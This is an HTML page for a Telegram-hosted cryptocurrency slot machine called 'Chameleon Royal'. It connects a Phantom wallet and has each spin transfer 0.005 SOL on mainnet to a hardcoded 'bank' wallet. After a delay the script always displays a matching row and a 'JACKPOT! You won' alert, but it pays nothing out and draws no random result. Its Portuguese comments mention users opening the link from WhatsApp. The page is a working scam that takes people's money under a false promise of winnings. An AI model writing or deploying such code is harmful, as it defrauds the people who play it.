<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Chameleon Royal</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    <style>
        body { background: #050505; color: #00ffcc; font-family: sans-serif; text-align: center; margin: 0; padding: 20px; }
        .machine { background: #111; padding: 20px; border: 4px solid #00ffcc; border-radius: 25px; display: inline-block; width: 90%; max-width: 380px; box-shadow: 0 0 30px #00ffcc44; }
        .display { font-size: 35px; background: #000; padding: 20px; border-radius: 15px; margin: 15px 0; border: 2px solid #333; color: white; }
        .btn-web3 { background: #8257e5; color: #fff; border: none; padding: 15px; border-radius: 12px; width: 100%; font-weight: bold; cursor: pointer; font-size: 16px; margin-bottom: 15px; box-shadow: 0 4px #5a3ba3; }
        .btn-web3:active { transform: translateY(2px); box-shadow: 0 2px #5a3ba3; }
        .btn-spin { background: #00ffcc; color: #000; border: none; padding: 18px; border-radius: 15px; font-weight: bold; font-size: 18px; width: 100%; cursor: pointer; }
        .btn-spin:disabled { background: #333; color: #666; }
        #status { font-size: 10px; margin-bottom: 10px; color: #888; }
    </style>
</head>
<body>
    <div class="machine">
        <button id="connectBtn" class="btn-web3" onclick="connect()">🔌 CONNECT WALLET</button>
        <div id="status">Status: Disconnected</div>

        <h1 style="margin:0; font-size: 20px;">CHAMELEON ROYAL</h1>
        <div id="slot" class="display">🦎 | 💎 | 💰</div>
        
        <button id="spinBtn" class="btn-spin" onclick="play()" disabled>CONNECT TO SPIN</button>
        <p style="font-size:10px; margin-top:10px;">COST: 0.005 SOL</p>
    </div>

    <script>
        const BANK_WALLET = "EsT69DqDkqXp4Y6zR6B2S7yq7m8m9NJTc"; 
        let userWallet = null;

        async function connect() {
            // Se o usuário estiver no Brave/Phantom
            if (window.solana || window.phantom) {
                try {
                    const resp = await window.solana.connect();
                    userWallet = resp.publicKey;
                    document.getElementById('status').innerText = "Wallet: " + userWallet.toString().slice(0,8) + "...";
                    document.getElementById('connectBtn').innerText = "✅ CONNECTED";
                    document.getElementById('connectBtn').style.background = "#00ffcc";
                    document.getElementById('connectBtn').style.color = "#000";
                    document.getElementById('spinBtn').disabled = false;
                    document.getElementById('spinBtn').innerText = "SPIN NOW (0.005 SOL)";
                } catch (err) { alert("Connection denied!"); }
            } else {
                // Se o cara abrir no Chrome/WhatsApp, ele recebe esse aviso:
                alert("❌ Wallet not found! Please open this link inside the Phantom or Brave browser app.");
            }
        }

        async function play() {
            try {
                const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
                const transaction = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: userWallet,
                        toPubkey: new solanaWeb3.PublicKey(BANK_WALLET),
                        lamports: 0.005 * solanaWeb3.LAMPORTS_PER_SOL,
                    })
                );
                const { signature } = await window.solana.signAndSendTransaction(transaction);
                document.getElementById('spinBtn').disabled = true;
                document.getElementById('spinBtn').innerText = "WAITING SOL...";
                
                setTimeout(() => {
                    document.getElementById('slot').innerText = "🦎 | 🦎 | 🦎";
                    alert("JACKPOT! You won the spin.");
                    document.getElementById('spinBtn').disabled = false;
                    document.getElementById('spinBtn').innerText = "SPIN AGAIN";
                }, 4000);
            } catch (err) { alert("Transaction failed!"); }
        }
    </script>
</body>
</html>
